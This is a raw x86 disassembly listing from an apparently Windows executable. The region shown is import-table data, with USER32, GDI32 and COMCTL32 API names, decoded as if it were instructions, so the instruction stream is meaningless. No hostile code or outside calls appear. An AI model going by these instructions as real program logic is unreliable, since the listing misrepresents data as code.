  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
